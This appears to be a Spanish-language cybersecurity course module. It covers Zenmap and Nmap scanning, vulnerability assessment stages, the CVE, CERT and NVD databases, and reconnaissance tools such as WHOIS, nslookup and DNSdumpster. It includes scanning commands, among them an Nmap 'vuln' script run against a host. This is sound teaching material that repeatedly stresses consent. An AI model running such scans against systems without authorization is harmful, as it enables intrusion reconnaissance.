En Zenmap, en la parte de arriba, encontraremos **diferentes pestañas**. Veremos Salida Nmap, Puertos/Servidores, Topología, Detalles del servidor y Escaneos. Todos ellos nos aporta información, así como poder elegir el tipo de servicio en la parte de la izquierda. Cuando le damos a Puertos/Servidores nos aparecerá una recopilación de todos los puertos abiertos y filtrados que hay en ese host. Hay que tener en cuenta que nos aparecerán más o menos puertos en función del tipo de escaneo que hayamos realizado.

![Salida Nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/salida-nmap.png?raw=true)

Si pinchamos en **Escaneos** nos aparecerán todos los escaneos que hemos realizado. Los podemos guardar para poder analizar los datos en otra ocasión, así como también eliminarlos y que no aparezcan ahí.

Esto lo podemos hacer con cualquier otro equipo que tengamos conectado a la red. Por ejemplo, podemos comprobar también los **puertos abiertos** y hacer un escaneo a nuestro teléfono móvil. Únicamente vamos a necesitar conocer cuál es la dirección IP. Eso sí, hay que tener en cuenta que este proceso puede tardar más o menos según el tipo de dispositivo.

En definitiva, Zenmap es un programa interesante con el que podemos hacer escaneos de puertos. Lo podemos usar en Windows, que es el sistema operativo más utilizado en equipos de escritorio, así como en Linux y macOS. Su uso es sencillo e intuitivo y podremos tener un mayor control sobre qué puertos tenemos abiertos, especialmente cuando necesitamos conocer si un equipo va a funcionar correctamente al hacer uso de alguna aplicación que requiera de ciertos puertos abiertos.

## **Implementación en empresas**

Muchas empresas deciden implementar estos sistemas para tener un poco más de control sobre sus redes. Pero esto es algo que se debe estudiar de forma detenida, y siguiendo unos pasos para que todo el proceso sea totalmente eficiente. Estos pasos son:

- **Evaluación de necesidades:** Siempre y cuando se implemente un nuevo sistema en una empresa, es necesario realizar una evaluación de las necesidades que vamos a tener dentro de la organización. Tendremos que identificar los objetivos, los activos críticos de la red, y todos y cada uno de los requisitos de seguridad que vamos a necesitar solucionar con NMAP.
- **Instalación y configuración:** En cualquier entorno, lo más recomendable es acudir siempre a los sitios oficiales para obtener la herramienta. Esto hará que el proceso sea totalmente seguro. Una vez disponemos de ella, tendremos que configurar correctamente los ajustes y opciones en NMAP para que esta cumpla con los requisitos específicos.
- **Políticas y procedimientos:** Las políticas que se establezcan en NMAP, deben ser claras y concisas. Aquí podremos configurar los escaneos y los tipos, así como los protocolos de notificación y reporte de hallazgos.
- **Capacitación:** Todo el personal que utilice NMAP, debe estar correctamente formado y capacitado para utilizarlo. Será necesario comprender cómo se utiliza la herramienta de forma segura y efectiva, y que siempre deben estar al tanto de todas las políticas y procedimientos.
- **Análisis:** Como es normal, NMAP nos va a dar unos resultados. Estos deben ser analizados, y como tal será necesario tener un procedimiento para ello. Esto hará que el análisis sea mucho más efectivo, y tengamos la información adecuada en todo momento.
- **Actualizaciones:** Una vez disponemos de la herramienta instalada y configurada, tendremos que establecer la forma en la cual vamos a mantenerla actualizada. Esto es algo crítico, ya que será necesario para que todo se mantenga lo más segura posible y con el funcionamiento más óptimo.

<aside>
👉 Como podemos ver, Nmap es una herramienta tremendamente útil, que nos puede dar muchas facilidades a la hora de gestionar redes.

</aside>

# **Identificación de sistemas y servicios vulnerables.**

La identificación de sistemas y servicios vulnerables es un paso crítico en las pruebas de penetración y la evaluación de seguridad. Aquí se describen los pasos generales y algunas herramientas comunes utilizadas para llevar a cabo esta tarea:

- **Escaneo de Puertos:** Utiliza herramientas como Nmap, Masscan o Unicornscan para identificar puertos abiertos en el sistema objetivo.
- **Identificación de Servicios:** Examina los servicios en los puertos abiertos utilizando técnicas como el fingerprinting para determinar la versión y el tipo de servicio.
- **Búsqueda de Vulnerabilidades Conocidas:** Utiliza bases de datos de vulnerabilidades, como el NIST National Vulnerability Database (NVD) o el Common Vulnerabilities and Exposures (CVE), para buscar vulnerabilidades conocidas asociadas a las versiones de servicios identificadas.
- **Escaneo Activo y Análisis de Configuración:** Utiliza herramientas como Nessus o OpenVAS para realizar escaneos de vulnerabilidades y analizar configuraciones en busca de debilidades conocidas.
- **Explotación Selectiva:** Si se cuenta con autorización explícita, se puede intentar la explotación controlada de vulnerabilidades para confirmar su existencia y evaluar el impacto potencial.
- **Análisis de Logs y Documentación:** Examina registros de sistemas y servicios para identificar actividades anómalas, y documenta todas las vulnerabilidades identificadas.

</aside>
💡 Es fundamental que todas las actividades se realicen con el consentimiento del propietario del sistema y en conformidad con las leyes y regulaciones aplicables. Además, los resultados deben ser documentados de manera clara y comunicados al cliente de manera ética y profesional.
</aside>

## **Evaluación de vulnerabilidad: qué es y cómo realizarla**

Una evaluación de vulnerabilidad analiza y estima los riesgos de las debilidades en seguridad de los sistemas de una organización. Se conocen más de 180.000 vulnerabilidades de seguridad y cada año se descubren nuevas. Con tantas brechas potenciales en la infraestructura y tantas posibilidades de ataque en los sistemas, no es sorprendente que la ciberdelincuencia haya aumentado considerablemente en los últimos años. Sin embargo, cuando se realizan de forma regular y correcta, las evaluaciones de vulnerabilidad pueden actuar como medida preventiva contra estas crecientes amenazas a la seguridad. Hay que considerar que, incluso con defensas de seguridad de primera calidad, los sistemas de información y seguridad de una organización pueden ser atacados, pirateados o secuestrados por los ciberdelincuentes.

## **Qué es una evaluación de vulnerabilidad**

Una evaluación de la vulnerabilidad es el proceso de revisión y estimación de todas las posibles debilidades de seguridad en la infraestructura de un sistema de información. Este tipo de evaluación se utiliza para identificar, priorizar y mitigar vulnerabilidades y para minimizar potenciales amenazas a la seguridad. Estas evaluaciones también descubren y analizan las vulnerabilidades dentro del entorno físico de la organización. Los objetivos de una evaluación de la vulnerabilidad pueden desglosarse en tres ideas principales:

- Identificar todas las vulnerabilidades
- Documentar las vulnerabilidades para su futura identificación y solución
- Orientar a los desarrolladores que crean soluciones para esas amenazas

Las evaluaciones de vulnerabilidad deben realizarse regularmente, especialmente cuando se instalan nuevos equipos, se añaden puertos o se introducen servicios. Además, las evaluaciones de vulnerabilidad pueden prevenir ataques al sistema en dispositivos -nuevos y antiguos- debido a amenazas como:

- Ataques de inyección, incluyendo ataques XSS y ataques SQL
- Configuraciones débiles por defecto, como contraseñas de administración y nombres de usuario fáciles de adivinar
- Ataques de malware y programas maliciosos
- Herramientas y dispositivos de autenticación defectuosos
- Datos sin cifrar

<aside>
💡 En el caso de las organizaciones de riesgo -como los bancos, los sistemas gubernamentales y aquellos que tienen acceso a información personal, como centros sanitarios-, las evaluaciones de vulnerabilidad pueden ayudar a identificar y reducir los puntos débiles antes de que sean explotados por los hackers.

</aside>

## **Tipos de evaluaciones de vulnerabilidades**

Los diferentes tipos de evaluaciones de vulnerabilidad utilizan herramientas individuales para identificar los puntos débiles del sistema y de la red. Los sistemas independientes pueden necesitar varios tipos de evaluaciones para identificar todas sus posibles vulnerabilidades.

- **Evaluación del host:** Una evaluación del host se centra en los servidores, estaciones de trabajo y otros elementos de la red críticos. Aunque los puertos y servicios pueden ser escaneados con evaluaciones de red, una evaluación de host es capaz de repasar el historial de parches y la configuración.
- **Evaluación de la red:** Una evaluación de la red se utiliza para identificar posibles vulnerabilidades de conjunto. Puede realizarse tanto para redes conectadas por cable como inalámbricas; estas evaluaciones ayudan a prevenir los ataques de seguridad dirigidos a esas redes privadas y públicas, así como a la información accesible de los equipos conectados.
- **Evaluación inalámbrica:** El objetivo de una evaluación inalámbrica es analizar la red Wi-Fi de una organización. Las redes inalámbricas inseguras, incluidas las que tienen puntos de acceso no aprobados, pueden provocar ataques a toda la infraestructura de una organización. Estas evaluaciones también verifican que la red de una organización está configurada de forma segura con HTTPS.
- **Evaluaciones de bases de datos:** Las evaluaciones de bases de datos analizan el conjunto de datos almacenados de una organización en busca de vulnerabilidades. Los ataques maliciosos, como las inyecciones SQL, suelen tener como objetivo bases de datos con configuraciones erróneas, bases de datos no registradas y aquellas que tienen test de desarrollo débiles (DevTest). Estas evaluaciones también ayudan a las organizaciones a identificar dónde hay que clasificar la información personal en una infraestructura.
- **Evaluación de aplicaciones:** Una evaluación de aplicaciones analiza las apps web, los sitios y el código fuente en busca de descargas de software incorrectas, configuraciones rotas y otras vulnerabilidades de seguridad. Suelen ser escaneos automatizados del código y la infraestructura del front-end.


![Evaluaciones Vulnerabilad](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/evaluaciones-vulnerabilad.png?raw=true)

## **Evaluación de vulnerabilidades frente a test de penetración**

Las evaluaciones de vulnerabilidades y las pruebas de penetración no son lo mismo, pero como las evaluaciones de vulnerabilidad también pueden incluir un test de penetración, ambas pueden confundirse fácilmente. Estas evaluaciones duales se conocen a menudo como evaluación de vulnerabilidades/test de penetración o VAPT, pero no tienen por qué realizarse siempre juntas.

Las pruebas de penetración se utilizan específicamente para encontrar debilidades en el personal, en la organización y en sus procedimientos y es un proceso adicional que puede añadirse a toda la evaluación de la vulnerabilidad. Las pruebas de penetración también intentan crear un daño en una aplicación o red explotando posibles debilidades en un entorno controlado, a fin de demostrar que las vulnerabilidades existen realmente.

Las pruebas de penetración utilizan maniobras tanto automáticas como manuales para comprobar las vulnerabilidades. Esas debilidades luego son analizadas por los investigadores para poder crear protecciones y defensas específicas. Sin embargo, no son suficientes por sí solas y deben ir seguidas de una evaluación completa de la vulnerabilidad.

## **Realización de una evaluación de la vulnerabilidad: etapas para identificar las vulnerabilidades**

Si se realiza una evaluación de la vulnerabilidad sin una prueba de penetración, hay cuatro etapas principales.

![Etapas Evaluacion](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/etapas-evaluacion.png?raw=true)

## **Identificación de activos y vulnerabilidades**

La identificación es la primera etapa cuando se realiza una evaluación de vulnerabilidades: antes de comenzar un escáner, debes identificar los activos escaneables, incluyendo herramientas populares, como dispositivos móviles, dispositivos del Internet de las Cosas y programas basados en la nube. A continuación, la infraestructura es escaneada por herramientas automatizadas o manualmente por analistas de seguridad. Se elabora un informe de evaluación de vulnerabilidad que describe los puntos débiles identificados.

## **Análisis**

En la etapa de análisis de una evaluación de vulnerabilidad, el objetivo es encontrar el origen y la causa de cada debilidad. Para identificar la causa raíz, los componentes de la infraestructura que son responsables de cada vulnerabilidad deben ser verificados y analizados más a fondo. En la etapa de análisis también se comprueba si hay sistemas mal instalados o actualizados.

Los escáneres de vulnerabilidad -y sus bases de datos integradas de vulnerabilidades conocidas- pueden señalar posibles puntos débiles del sistema, dispositivos vulnerables y software de riesgo para ayudar a completar esta etapa. Dado que muchas vulnerabilidades se comunican públicamente, se pueden identificar rápidamente y analizar su causa original.

## **Evaluación de riesgo y priorización**

Después de haber identificado y analizado las vulnerabilidades de tu organización, es el momento de llevar a cabo una evaluación de riesgos y determinar la priorización. La primera etapa debería haber proporcionado informes de evaluación, que pueden utilizarse para determinar qué vulnerabilidades son más peligrosas para una organización. Durante una evaluación de riesgos, los analistas de seguridad asignan a cada vulnerabilidad una puntuación de gravedad; los números más altos indican puntos débiles que deben abordarse lo antes posible. Las vulnerabilidades se clasifican en función de una serie de factores, entre ellos:

- Los sistemas afectados
- La información puesta en riesgo
- Facilidad de ataque o compromiso
- Daño potencial a la infraestructura y a la organización

## **Reparación y mitigación**

La etapa final al realizar una evaluación de vulnerabilidad es la de remediación y mitigación. Esta etapa suele estar a cargo de los profesionales de la seguridad y los equipos de operaciones, y se centra en encontrar formas de aliviar las debilidades mientras se desarrollan planes para disminuir la posibilidad de que vuelvan a aparecer las vulnerabilidades. Al crear planes de remediación y mitigación, los profesionales deben centrarse en dos factores:

- **Gravedad:** tras la priorización, los equipos deben abordar primero las vulnerabilidades más graves. Con el tiempo, deberían ser capaces de crear y publicar correcciones para cada vulnerabilidad detectada pero la corrección temprana se centra en las más peligrosas.
- **Exposición a la vulnerabilidad:** determinar si una vulnerabilidad está orientada al público o a la Red también debería ser una de las principales preocupaciones de los profesionales de la reparación. Las vulnerabilidades orientadas a Internet son más fáciles de explotar por los ciberdelincuentes, por lo que estas debilidades deben mitigarse en primer lugar, seguidas de los dispositivos propiedad de los empleados y los que almacenan información sensible.

Si se publican parches del sistema o correcciones de la vulnerabilidad, el proceso de evaluación de la vulnerabilidad debe comenzar de nuevo. Es importante ejecutar una evaluación cuando se instala cualquier tipo de sistema o parche nuevo para así identificar, analizar, priorizar y remediar rápidamente cualquier nueva vulnerabilidad que pueda surgir.

## **Herramientas de evaluación de la vulnerabilidad**

Con frecuencia las herramientas de evaluación de la vulnerabilidad son procesos automatizados que pueden ser utilizados por cualquiera, desde los expertos en ciberseguridad y los cazadores de amenazas hasta el trabajador que se conecta en su casa. Estas herramientas escanean los sistemas en busca de vulnerabilidades existentes y de nuevos puntos débiles no comunicados. Además, cada herramienta de evaluación tiene un propósito específico basado en el tipo de evaluación que debe realizar.

**Tipos de herramientas de evaluación de la vulnerabilidad:**

- Escáneres de aplicaciones web
- Escáneres de protocolos
- Escáneres de red
- Escáneres de vulnerabilidad externa e interna
- Escáneres ambientales

Además del tipo de evaluación que realiza cada herramienta, éstas tienen características propias que el usuario debe tener en cuenta. A la hora de elegir una herramienta de evaluación, ten en cuenta estas características:

- Frecuencia de las actualizaciones
- Capacidad para minimizar los falsos positivos y negativos
- Capacidad de integración con otras herramientas de evaluación y seguridad
- Resultados procesables

Si bien las evaluaciones de vulnerabilidad son una parte necesaria del proceso de ciberseguridad, hay precauciones adicionales que puedes tomar para mantener mejor protegida la infraestructura. Invertir en una VPN puede ayudar a proteger tu navegación en redes públicas y privadas, mientras que un antivirus puede ayudar a mantener seguros tanto los dispositivos móviles como de sobremesa.

## **Identificando sistemas operativos y servicios**

Como vemos, nmap nos permite detectar puertos que están escuchando en una IP o un rango. Posteriormente veremos además cómo se pueden definir otras técnicas de sondeo. Además, nmap nos permite intentar identificar qué tecnología (producto, versión, etc.) hay detrás de un puerto abierto, o incluso el sistema operativo instalado en un servidor, con los parámetros -O y -sV. Esta detección se basa en la “firma” (fingerprint) de las respuestas que da el servicio a determinadas llamadas.

> Sudo nmap -O -sV 192.168.1.1

![Etapas Evaluacion](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/etapas-evaluacion.png?raw=true)

En este caso, no solamente sabemos que esta máquina tiene determinados puertos abiertos. También nos dice que es un linux y las versiones de los distintos puertos que están escuchando, de forma que esta información puede ser utilizada para explotar vulnerabilidades sobre versiones no parcheadas, etc.

![Sudo nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sudo-nmap.png?raw=true)

## **Utilizando más técnicas de sondeo**

Por defecto nmap utiliza SYN como técnica de sondeo. Es una técnica rápida y poco intrusiva / detectable, pero en ocasiones , pero soporta en total 12 técnicas distintas que podemos definir como parámetros, tal como podemos ver en el [manual de uso de la herramienta](https://nmap.org/man/es/man-port-scanning-techniques.html). Por ejemplo, si queremos hacer un escaneo basado en llamadas UDP, podemos hacer una llamada del tipo:

> Sudo nmap -sU 192.168.1.1

![Sudo nmap](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sudo-nmap.png?raw=true)
**Usuario**

## **Buscando vulnerabilidades con nmap**

Si bien existen herramientas más “cómodas” y específicas para la búsqueda de vulnerabilidades, como por ejemplo Nessus, o suites como Metasploit que consolida diversas herramientas, nmap también nos permite realizar análisis de vulnerabilidades.

Para ello, utiliza una serie de scripts Lua que están ubicados en una ruta de nuestra máquina (en el caso de Kali, en /usr/share/nmap/scripts/ ) y que se pueden invocar con –script o su equivalente -sC.

Los scripts pueden pertenecer a una o varias categorías, de forma que podemos pedir a nmap que evalúe, por ejemplo, todos los scripts de una categoría contra un host. Hay algunas categorías especialmente interesantes como “vuln” (scripts dedicados a detectar vulnerabilidades en el destino), “exploit”, etc.

Por ejemplo, si queremos escanear los scripts de categoría vulnerabilidad contra un host:

> nmap --script vuln scanme.nmap.org

![Nmap Script](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nmap-script.png?raw=true)

Como vemos, el script ha detectado muchas vulnerabilidades. Si analizamos los scripts veremos que muchos de ellos servirán para explotar estas vulnerabilidades. En definitiva, nmap incluye incluso opciones interesantes para evaluar vulnerabilidades e incluso lanzar exploits, si bien existen otras herramientas utilizadas comúnmente para este propósito.

## **Precauciones**

Siempre y cuando vamos a utilizar este tipo de programas o herramientas, debemos tener claro que esto puede ser peligroso para los usuarios. Al escanear los paquetes que se transportan por la red, podemos tener gran cantidad de información en nuestra mano. Esto hace que sea más sencillo que se produzca alguna filtración de datos. Por lo cual siempre se deben utilizar de forma adecuada, y con fines legales. Si bien el uso de este tipo de aplicaciones no es ilegal, todo lo contrario, debemos tener cuidado con su uso.

Tenemos una grandísima cantidad de programas para realizar escaneos de vulnerabilidades a nuestras redes, equipos, servicios web y otros servicios que incorporan los servidores. Dependiendo de lo que estemos realizando, tendremos que utilizar un escáner u otro.

## **Bases de datos de vulnerabilidades**

Un aspecto importante es que las distintas soluciones de gestión de seguridad informática se valen de estas bases de datos para apoyarnos en la mitigación de los riesgos de potenciales ciberataques. Las bases de datos que encontrarás a continuación, y otras más, son los principales contribuyentes a las soluciones de gestión de seguridad. Antes de que existiesen estándares como el **CVE y CVSS**, las distintas soluciones tenían bases de datos propias de cada uno y con una gran disparidad de criterios a la hora de nombrarlos, clasificar su criticidad y otros aspectos más.

## **CVE (Common Vulnerabilities and Exposures)**

Es una de las fuentes más confiables a la hora de identificar, analizar y certificar una vulnerabilidad encontrada. Cada una de las vulnerabilidades presentes en esta base de datos, cuenta con número **CVE**. Este último es proporcionado por un grupo de autoridades especializadas del grupo de trabajo CVE. Pero, ¿por qué una vulnerabilidad tendría un número identificador? Esto permite que el manejo de la información respecto a la misma sea mucho más confiable, evitando ambigüedades o datos erróneos que perjudiquen la información respecto a la vulnerabilidad en cuestión. Este mismo número permite que sea fácilmente identificado y evaluado por las **distintas herramientas de seguridad** como los SIEM, que son los Sistemas de Gestión de Información y Eventos de Seguridad, para que puedan facilitar la puesta en marcha de acciones para mitigar los riesgos.

Desde su fundación en el año 1999, CVE se ha convertido en un estándar a la hora de hacer pública cualquier vulnerabilidad. Como hemos comentado, las distintas herramientas de seguridad implementadas, sobre todo en redes empresariales, personas especializadas en seguridad informática, e incluso, el público en general, logran comunicarse más fluidamente. Esto último, respecto a lo que consiste cierta vulnerabilidad y sus impactos. Estamos seguros que en algún momento, habrás leído alguna noticia, publicación o tuit respecto a una o varias vulnerabilidades. En muchos casos, **hacen referencia al número CVE** como una forma de respaldo seguro y confiable respecto a la información presentada.

## **CERT Base de Datos de Vulnerabilidades**

Otra base de datos que en esta ocasión corresponde a la prestigiosa [CERT](https://www.kb.cert.org/vuls/) (***Computer Emergency Response Team***). La misma provee información respecto a cualquier vulnerabilidad de software. Los datos que se incluyen son detalles técnicos, posibles formas de remediación y cuáles son los fabricantes afectados. Varios de los registros encontrados son resultado del esfuerzo de individuos. Así también, personas que trabajan fuera de las instituciones de gobierno con el fin de poner a disposición de toda la información encontrada.

En consecuencia, varios de los registros podrían dar la impresión de que falta profundidad respecto a uno o más datos. Es por eso que la propia CERT recomienda referirse a bases de datos de instituciones de gobierno **como la NVD**, de la cual hablaremos a continuación.

## **NVD (Base de Datos Nacional de Vulnerabilidades)**

Como comentamos recientemente, esta base de datos está ligada a una institución gubernamental. La misma es la **[NIST](https://nvd.nist.gov/)**, que es el Instituto Nacional de Estándares y Tecnología. Es un extenso repositorio que aloja datos respecto a vulnerabilidades que se han gestionado mediante el protocolo SCAP. Sus siglas significan *Security Content Automation Protocol*.

La ventaja directa de estos datos es que se hace mucho más fácil la automatización de tareas repetitivas de la gestión de vulnerabilidades, medición de indicadores de seguridad y cumplimiento. Además, podrás encontrar todo lo relacionado a fallos de seguridad encontrados en todo tipo de software. Así también, sabrás respecto a errores en la configuración, el nombre del fabricante afectado y los potenciales impactos de la vulnerabilidad o fallo encontrado.

![received](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/received.png?raw=true)

Un detalle muy importante es que, al ingresar al panel de estadísticas, nos encontraremos con las vulnerabilidades listadas con la clasificación CVE, que corresponde a la primera base de datos que hemos citado. Esto significa que prácticamente toda vulnerabilidad citada en CVE, tiene un respaldo extra de parte de la base de datos nacional. A pesar de que esta es una institución que depende del gobierno de los Estados Unidos, es una de las fuentes más consultadas para estar al tanto de las últimas vulnerabilidades.

Por otro lado, dicho panel muestra un par de gráficos basados en **CVSS**. Estas siglas significan *Common Vulnerability Scoring System*. Este es un estándar abierto que se utiliza para medir la gravedad de cada una de las vulnerabilidades encontradas. Básicamente, se cuenta con cuatro posibilidades o niveles: bajo, medio, alto y crítico. Se llega a concluir que una vulnerabilidad tiene determinado nivel en base a una serie de métricas. El estándar, así como todas las bases de datos que hemos citado, es de acceso libre y gratuito para cualquier persona interesada.

# **Recopilación de información sobre el objetivo**

La recopilación de información sobre el objetivo, también conocida como fase de "reconocimiento" o "enumeración", es una etapa crucial en pruebas de penetración y evaluaciones de seguridad. Aquí se describen pasos generales y algunas técnicas y herramientas comunes utilizadas en esta fase:

- **Definir el Alcance:** Establecer los límites y objetivos específicos de la recopilación de información, y obtener el consentimiento del propietario del sistema o red.
- **Identificar Objetivos:** Determinar los sistemas, redes, aplicaciones y servicios específicos que se van a evaluar durante la prueba.
- **Recopilación de Dominios:** Utilizar técnicas como WHOIS, DNS enumeration, y búsqueda en motores de búsqueda para recopilar información sobre dominios asociados al objetivo.
- **Escaneo de Subdominios:** Utilizar herramientas como Sublist3r, Subfinder, o DNSDumpster para identificar subdominios asociados al objetivo.
- **Identificación de Servidores de Correo:** Buscar servidores de correo asociados al objetivo utilizando técnicas de resolución DNS y herramientas especializadas.
- **Enumeración de Redes:** Utilizar técnicas como escaneo de red, ARP scanning, o SNMP enumeration para identificar dispositivos y hosts en la red del objetivo.
- **Identificación de Tecnologías:** Utilizar herramientas como Wappalyzer, BuiltWith o WhatWeb para identificar tecnologías, plataformas y servicios utilizados en el objetivo.
- **Exploración de Aplicaciones Web:** Identificar aplicaciones web en el objetivo y obtener información sobre sus tecnologías, versiones y configuraciones.

## **Herramientas Comunes para Recopilación de Información:**

- **WHOIS Lookup:** Obtener información sobre propietarios de dominios y direcciones IP.
    - **Herramienta:** WHOIS (comando de línea), WHOIS websites.
- **DNS Enumeration**: Identificar registros DNS, incluyendo servidores de nombres y direcciones IP asociadas.
    - **Herramienta:** Dig, NSLookup, DNSRecon.
- **Subdomain Enumeration:** Identificar subdominios asociados al dominio principal.
    - **Herramienta:** Sublist3r, Subfinder, DNSDumpster.
- **Escaneo de Red:** Identificar hosts activos y dispositivos en la red.
    - **Herramienta:** Nmap, Masscan, ARP Scan.
- **Exploración de Aplicaciones Web:** Identificar aplicaciones web y sus tecnologías asociadas.
    - **Herramienta:** Wappalyzer, BuiltWith, WhatWeb.
- **Búsqueda de Tecnologías y Versiones:** Identificar tecnologías y versiones utilizadas en el objetivo.
    - **Herramienta:** Shodan, Censys, Nmap.

La información recopilada durante esta fase proporciona una base sólida para las etapas posteriores de pruebas de penetración, permitiendo a los profesionales de seguridad comprender la superficie de ataque y orientar sus esfuerzos de manera efectiva. Es esencial realizar estas actividades dentro de los límites éticos y legales, obteniendo siempre el consentimiento del propietario del sistema o red.

## **Recopilación de información sobre aplicaciones web usando Kali Linux y recursos web**

La recopilación de inteligencia es la técnica de recopilar información numerosa sobre el objetivo. La recopilación de información es el primer paso más importante en la realización de pruebas de penetración. La recopilación de información le brinda al probador de penetración una puerta de entrada para decidir qué vulnerabilidades se encuentran comúnmente en aplicaciones web específicas. Hay muchas herramientas para recopilar información en Kali Linux. En este tutorial, aprenderemos específicamente cómo recopilar información de aplicaciones web como Whois, Whatweb, NSLookup y CMSeek. Estas herramientas son de código abierto y ya están preinstaladas en Kali Linux. Si no tiene Kali Linux, puede descargar o revisar estos proyectos de herramientas en GitHub.

Los enlaces se proporcionan en cada sección de herramientas a continuación. La recopilación de información se puede dividir en dos métodos: recopilación de información activa y recopilación de información pasiva. Al recopilar información de forma activa, el hacker se pone en contacto con el objetivo. Por ejemplo, use una carga útil diseñada para evaluar cómo respondería una aplicación web determinada. Mientras recopila información de forma pasiva, el pirata informático utiliza un programa de terceros para hacer el trabajo, por ejemplo, utilizando la técnica OSINT para recopilar mucha información disponible en Internet. Dada esta definición simple, sabrá de inmediato qué herramientas de recopilación de información que vamos a utilizar a continuación están categorizadas. Conoceremos en detalle los siguientes temas:

- Tipo de información recopilada durante la fase de recopilación de información
- Información detallada de propiedad de un nombre de dominio
- Identificar la dirección IP del servidor de nombres

Antes de que un probador de penetración recopile información, primero define el objetivo. Diferentes categorías de objetivos utilizan diferentes técnicas y herramientas apropiadas. Por ejemplo, si su objetivo es una red inalámbrica, es posible que no se apliquen las técnicas utilizadas para recopilar información sobre aplicaciones web. Kali Linux es una poderosa distribución de Linux que proporciona herramientas de código abierto para diversas tareas de recopilación de información.

## **WHOIS**

GitHub: [https://github.com/rfc1036/whois](https://github.com/rfc1036/whois) WHOIS es un protocolo de consulta y respuesta transaccional basado en TCP comúnmente utilizado para proporcionar información sobre la propiedad de nombres de dominio, p. B. Fecha de registro o fecha de creación del dominio y fecha de vencimiento, servidores de nombres e información de contacto del registrante (dirección, teléfono y correo). Algunos proveedores o empresas de registro de dominios pueden ofrecer un servicio para ocultar la información de registro.

Whois viene preinstalado en Kali Linux, también se puede encontrar en la web. A menudo uso Whois en Kali Linux y Whois en línea para ver si hay alguna diferencia en la información entre ellos. En este tutorial definitivamente cubriremos Whois en Kali Linux. Echemos un vistazo al uso del comando Whois en el terminal Kali Linux a continuación:

![Whois](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/whois.png?raw=true)

Uso del comando Whois en Kali Linux Para ejecutar Whois en Kali Linux, ingrese el siguiente patrón de comando: Puede agregar “–verbose” al final del comando para mostrar información más detallada. Recuerda escribir [domain-name] sin tipo de protocolo ni HTTP ni HTTPS. Por ejemplo: El siguiente ejemplo es el resultado de la información del dominio con Whois que está disponible públicamente.

![Whois 1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/whois1.png?raw=true)

![Whois 2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/whois2.png?raw=true)


Información del registratario de Whois Como se muestra arriba, hemos podido obtener mucha información detallada sobre la propiedad del nombre de dominio como por ejemplo: Fecha de creación, nombre del registrante, dirección, número de teléfono y dirección de correo electrónico. Para guardar la información de la salida del terminal o del archivo de texto, puede agregar un operador de redirección de salida (‘>>’) seguido del nombre y tipo de archivo. El uso de este operador al final de cada comando significa que cualquier resultado que se pretenda mostrar en el terminal también se guardará en un archivo de texto. Whois dominio >> whois_Dominio.txt Ahora observe cómo el registrante del nombre de dominio usa un servicio privado para mostrar su información whois.

![Usuario Whois](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/usuario-whois.png?raw=true)

También podes obtener información con esta herramienta web: [https://whois.domaintools.com/](https://whois.domaintools.com/)

![Whois Record](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/whois-record.png?raw=true)

![Domain name](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/domain-name.png?raw=true)

## **Nslookup**

NSlookup, abreviatura de búsqueda de servidor de nombres, es una herramienta de administración de red para consultar detalles del sistema de nombres de dominio de Internet, como registro de dirección IP, registro MX (servidor de correo), servidor de nombres, registro SOA (inicio de autoridad) y registro TXT. NSLookup es un programa estándar para todos los sistemas operativos. NSLookup también viene con una versión en línea. Hay tantos sitios web que ofrecen un programa NSLookup.

> Descubre el registro "A" (dirección IP) del dominio

> **# nslookup**

![nslookup](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nslookup.png?raw=true)

**# nslookup google.com**

![nslookup-google](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nslookup-google.png?raw=true)

![nslookup servidor](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nslookup-servidor.png?raw=true)

**2. Descubre la búsqueda de dominio inversa**

**# nslookup 142.250.79.142**

![nslookup usuario](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nslookup-usuario.png?raw=true)

![nslookup users](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nslookup-users.png?raw=true)

## **ViewDNS**

Las herramientas proporcionadas por ViewDNS.info permiten a los usuarios recopilar una gran cantidad de datos sobre un sitio web o dirección IP determinados. El valor de estos datos a veces puede subestimarse cuando se analizan en su forma cruda, pero cuando se colocan en contexto pueden ser bastante poderosos. Esta sección tiene como objetivo demostrar parte de la información que se puede descubrir utilizando las herramientas disponibles en este sitio.

[https://viewdns.info/](https://viewdns.info/)

![viewdns](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/viewdns.png?raw=true)

## **DNSdumpster**

DNSdumpster.com es una herramienta GRATUITA de investigación de dominios que puede descubrir hosts relacionados con un dominio. Encontrar hosts visibles desde la perspectiva de los atacantes es una parte importante del proceso de evaluación de la seguridad.

[https://dnsdumpster.com/](https://dnsdumpster.com/)

![dnsdumpster](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/dnsdumpster.png?raw=true)

### **Mapa del sitio**

![mapa](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/mapa.png?raw=true)

## **Búsqueda de sub dominios**

Las herramientas de búsqueda de subdominios permiten descubrir los subdominios de cualquier dominio objetivo para descubrir posibles puntos de entrada de ataques. Encuentre los sistemas menos protegidos y, por tanto, más vulnerables a los ataques.

[https://subdomains.whoisxmlapi.com/](https://subdomains.whoisxmlapi.com/)

![subdomains](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/subdomains.png?raw=true)


## **Shodan**

Shodan es el primer motor de búsqueda del mundo para dispositivos conectados a Internet. Descubra cómo la inteligencia de Internet puede ayudarle a tomar mejores decisiones.

